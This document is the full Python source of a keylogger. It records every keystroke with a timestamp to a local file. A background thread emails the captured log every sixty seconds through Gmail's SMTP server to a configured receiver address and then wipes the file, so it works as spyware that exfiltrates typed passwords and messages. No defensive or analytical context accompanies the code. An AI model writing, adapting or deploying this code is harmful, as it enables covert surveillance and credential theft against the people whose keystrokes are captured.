# Import required libraries
from pynput.keyboard import Listener  # For capturing keystrokes
from datetime import datetime         # For adding timestamps to logs
import smtplib                        # For sending logs via email
from email.mime.text import MIMEText  # For formatting email content
import os                             # For file operations
import threading                      # To send emails periodically without blocking

# Global variables
log_file = "keylog.txt"               # File to save the keystrokes
email_interval = 60                   # Interval in seconds to send logs via email

# Email credentials (replace with your details)
sender_email = ""
receiver_email = "receiver_email@example.com"
email_password = "your_password"

# Function to write keystrokes to a file with timestamps
def write_to_file(key):
    try:
        with open(log_file, "a") as file:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            key = str(key).replace("'", "")  # Remove single quotes around keys
            if key == "Key.space":
                file.write(f"{timestamp} - [SPACE]\n")
            elif key == "Key.enter":
                file.write(f"{timestamp} - [ENTER]\n")
            elif key.startswith("Key."):
                file.write(f"{timestamp} - [{key[4:].upper()}]\n")  # Special keys
            else:
                file.write(f"{timestamp} - {key}\n")  # Normal keys
    except Exception as e:
        print(f"Error writing to file: {e}")

# Function to send the log file via email
def send_logs_via_email():
    try:
        if os.path.exists(log_file):  # Ensure the log file exists
            with open(log_file, "r") as file:
                logs = file.read()

            # Prepare the email
            msg = MIMEText(logs)
            msg['Subject'] = "Keylogger Logs"
            msg['From'] = sender_email
            msg['To'] = receiver_email

            # Connect to the email server and send the email
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()  # Start a secure connection
                server.login(sender_email, email_password)
                server.sendmail(sender_email, receiver_email, msg.as_string())

            print("Logs emailed successfully!")

            # Clear the log file after sending
            open(log_file, "w").close()
        else:
            print("No log file found to email.")
    except Exception as e:
        print(f"Error sending email: {e}")

# Function to schedule email sending periodically
def schedule_email_sending():
    while True:
        send_logs_via_email()
        threading.Event().wait(email_interval)  # Wait for the specified interval

# Function called on every key press
def on_press(key):
    write_to_file(key)

# Main function to start the keylogger
def start_keylogger():
    # Start a thread for email reporting
    email_thread = threading.Thread(target=schedule_email_sending, daemon=True)
    email_thread.start()

    # Start listening to keystrokes
    with Listener(on_press=on_press) as listener:
        listener.join()

# Entry point of the script
if __name__ == "__main__":
    start_keylogger()
